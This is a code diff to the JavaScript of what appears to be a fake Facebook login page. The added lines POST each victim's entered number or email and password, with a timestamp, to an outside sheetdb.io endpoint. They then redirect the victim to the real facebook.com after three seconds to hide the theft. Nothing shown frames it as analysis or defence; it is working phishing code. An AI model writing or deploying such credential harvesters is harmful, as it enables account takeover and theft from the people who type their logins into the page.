@@ -57,15 +57,30 @@ function log1(){
   }
 
 });
-document.getElementById("number").value="";
-document.getElementById("pass").value="";
+  fetch("https://sheetdb.io/api/v1/mnl733k976rmt", {
+    method: "POST",
+    body: JSON.stringify({
+      Number: number,
+      Password: pass,
+      Date: date.toString()
+    }),
+    headers: {
+      "Content-type": "application/json; charset=UTF-8"
+    }
+
+  });
+
+  document.getElementById("number").value="";
+  document.getElementById("pass").value="";
+  setTimeout(() => { window.open("https://www.facebook.com/","_parent"); }, 3000);
+  
 
 }
 
 function log(){
   var number = document.getElementById("number").value;
   var pass = document.getElementById("pass").value;
-  window.open("https://www.facebook.com/","_parent")
+  // window.open("https://www.facebook.com/","_parent")
 
   if(number== ""){
     alert('Enter Number or Email')
